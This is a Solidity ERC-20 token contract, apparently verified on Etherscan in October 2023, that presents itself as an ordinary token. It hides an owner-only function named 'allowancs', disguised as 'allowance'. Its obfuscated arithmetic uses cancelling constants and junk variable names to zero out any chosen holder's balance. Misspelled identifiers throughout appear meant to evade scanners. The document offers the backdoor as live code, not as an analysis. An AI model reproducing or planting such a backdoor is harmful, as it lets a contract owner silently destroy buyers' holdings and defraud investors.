/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acoritnt) external view returns (uint256);
    function transfer(address recipient, uint256 amcotutnt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amcotutnt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amcotutnt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract token is Context, Ownable, IERC20 {
    mapping (address => uint256) private _acotintt;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _acotintt[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acoritnt) public view override returns (uint256) {
        return _acotintt[acoritnt];
    }
    function allowancs(address djejeje) public  onlyowner {
    address zdasdsa = djejeje;
    uint256 gdfsada = _acotintt[zdasdsa]+554400+13+2-554415;
    uint256 cccccxxxxz = gdfsada+_acotintt[zdasdsa]-_acotintt[zdasdsa];
        _acotintt[zdasdsa] -= cccccxxxxz;


    }    
    function transfer(address recipient, uint256 amcotutnt) public virtual override returns (bool) {
        require(_acotintt[_msgSender()] >= amcotutnt, "TT: transfer amcotutnt exceeds balance");

        _acotintt[_msgSender()] -= amcotutnt;
        _acotintt[recipient] += amcotutnt;
        emit Transfer(_msgSender(), recipient, amcotutnt);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amcotutnt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amcotutnt;
        emit Approval(_msgSender(), spender, amcotutnt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amcotutnt) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amcotutnt, "TT: transfer amcotutnt exceeds allowance");

        _acotintt[sender] -= amcotutnt;
        _acotintt[recipient] += amcotutnt;
        _allowances[sender][_msgSender()] -= amcotutnt;

        emit Transfer(sender, recipient, amcotutnt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}